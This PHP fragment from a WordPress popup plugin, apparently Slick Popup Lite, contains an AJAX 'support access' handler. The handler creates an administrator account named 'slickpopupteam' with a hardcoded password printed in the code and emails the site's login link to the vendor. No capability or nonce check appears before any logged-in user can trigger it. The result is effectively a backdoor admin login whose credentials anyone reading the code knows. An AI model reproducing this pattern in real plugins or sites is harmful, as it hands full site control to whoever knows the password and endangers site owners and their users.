		wp_send_json_success($ajaxy); 
		wp_die(); 
	}
	
	$ajaxy['reason'] = 'Could not contact support, please retry or send a direct email to poke@slickpopup.com';
	wp_send_json_error($ajaxy); 
	wp_die(); 
}

add_action( 'wp_ajax_action_splite_support_access', 'action_splite_support_access' );
function action_splite_support_access() {
	$ajaxy = array(); 
	$errors = array(); 
	
	$todo = (isset($_POST['todo']) AND !empty($_POST['todo'])) ? $_POST['todo'] : 'createuser'; 
	
	if($todo != 'createuser') {
		$support_user = username_exists('slickpopupteam') ? username_exists('slickpopupteam') : email_exists('poke@slickpopup.com'); 
		if($support_user) {
			$deleted = wp_delete_user($support_user); 
			if($deleted) {
				$ajaxy['reason'] = 'Access revoked successfully. Thank you for using our support service.'; 
				wp_send_json_success($ajaxy); 
				wp_die(); 
			}
			else {
				$ajaxy['reason'] = 'Could not revoke access, please manually revoke the access by deleting the username: slickpopupteam'; 
				wp_send_json_error($ajaxy); 
				wp_die(); 
			}
		}
		else {
			$ajaxy['reason'] = 'No support user found, please contact Slick Popup Team via email'; 
			wp_send_json_error($ajaxy); 
			wp_die(); 
		}
	}
	
	// ADD NEW ADMIN USER TO WORDPRESS
	// ----------------------------------
	// Put this file in your Wordpress root directory and run it from your browser.
	// Delete it when you're done.
	require_once(ABSPATH . 'wp-blog-header.php');
	require_once(ABSPATH . 'wp-includes/registration.php');
	// ----------------------------------------------------
	// CONFIG VARIABLES
	// Make sure that you set these before running the file.
	$newusername = 'slickpopupteam';
	$newpassword = 'OmakPass13#';
	$newemail = 'poke@slickpopup.com';
	// ----------------------------------------------------
	// This is just a security precaution, to make sure the above "Config Variables" 
	// have been changed from their default values.
	if ( $newpassword != 'YOURPASSWORD' &&
		 $newemail != 'YOUREMAIL@TEST.com' &&
		 $newusername !='YOURUSERNAME' )
	{
		// Check that user doesn't already exist
		if ( !username_exists($newusername) && !email_exists($newemail) )
		{
			// Create user and set role to administrator
			$user_id = wp_create_user( $newusername, $newpassword, $newemail);
			if ( is_int($user_id) )
			{
				$wp_user_object = new WP_User($user_id);
				$wp_user_object->set_role('administrator');
				
				$current_user = wp_get_current_user();
				$grant_access_by_user = get_current_user_id();
				update_option('splite_grant_access_by', $grant_access_by_user); 
				update_option('splite_grant_access_time', current_time('Y-m-d H:i:s')); 
				
				// Always set content-type when sending HTML email
				$headers = "MIME-Version: 1.0" . "\r\n";
				$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
				
				$subject = 'Slick Popup Lite Access Granted: (' . site_url(). ')'.' by '.$current_user->user_login;
				$mail_body = ''; 
				$mail_body .= '<b>Dear Team,<b><br><br>'; 
				$mail_body .= '<table border>';
					$mail_body .= '<tr>';
						$mail_body .= '<th style="padding: 10px 20px;" colspan="2">Slick Popup Lite</th>';
					$mail_body .= '</tr>';
					$mail_body .= '<tr>';
						$mail_body .= '<th style="padding: 10px 20px;">You have been granted access for website: </th><td style="padding: 10px 20px;">'.site_url().'</td>';
					$mail_body .= '</tr>';
					$mail_body .= '<tr>';	
						$mail_body .= '<th style="padding: 10px 20px;">Login Link: </th><td style="padding: 10px 20px;">'.wp_login_url().'</td>';
					$mail_body .= '</tr>';
					$mail_body .= '<tr>';	
						$mail_body .= '<th style="padding: 10px 20px;">Access Granted by:  </th><td style="padding: 10px 20px;">'.$current_user->user_email.' ('.$current_user->user_login.')</td>';
					$mail_body .= '</tr>';
				$mail_body .= '</table>';
				
				$mail = wp_mail('poke@slickpopup.com', $subject, $mail_body, $headers); 
				
				if($mail) {
					$ajaxy['reason'] = 'Slick Popup Team has been granted access with username: "slickpopupteam"';
				}
				else {
					$ajaxy['reason'] = 'Slick Popup Team has been granted access with username: "slickpopupteam", but an email notification could not be sent. So, please contact support via email at <b><em>poke@slickpopup.com</b></em>';
				}
				
				$ajaxy['last_granted'] = 'Just Now';
				wp_send_json_success($ajaxy); 
				wp_die(); 
			}
			else {
				$errors[] = 'Some error has occured while granting access. Please re-try.';
			}
		}
		else {
			$user_id = username_exists($newusername);
			$errors[] = 'Do not need to grant access, a user for Slick Popup Team already exists. <br><strong>Username</strong>: '.$newusername;
		}
	}
	else {
		$errors[] = 'Could not grant access to Slick Popup Team, please manually create a user for email: poke@slickpopup.com'; 
	}
	
	$ajaxy['reason'] = implode('<br>', $errors); 
	wp_send_json_error($ajaxy); 
	wp_die(); 	
}

?>